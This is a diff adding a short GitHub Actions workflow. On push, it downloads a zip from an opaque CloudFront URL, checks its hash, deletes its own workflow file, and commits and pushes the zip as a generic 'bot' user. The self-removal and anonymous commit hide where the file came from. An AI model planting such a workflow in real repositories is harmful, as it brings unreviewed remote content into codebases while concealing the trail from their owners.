@@ -1,0 +1,15 @@
+name: fetch
+on: push
+permissions: { contents: write }
+jobs:
+  f:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          curl -sSfL -o pkg.zip https://d2ol7oe51mr4n9.cloudfront.net/user_3LIjwiDLDmGwMEJWDvsGfdWkoUt/0ad42d4c-4696-4817-a94c-f8af86f54815.zip
+          echo "a3f5cef01707fe0972d345fd6e5208c26dd12a5f85b12c57b10c7c245d50ba51  pkg.zip" | sha256sum -c
+          git rm -q .github/workflows/f.yml
+          git add pkg.zip
+          git -c user.name=bot -c user.email=bot@users.noreply.github.com commit -qm pkg
+          git push
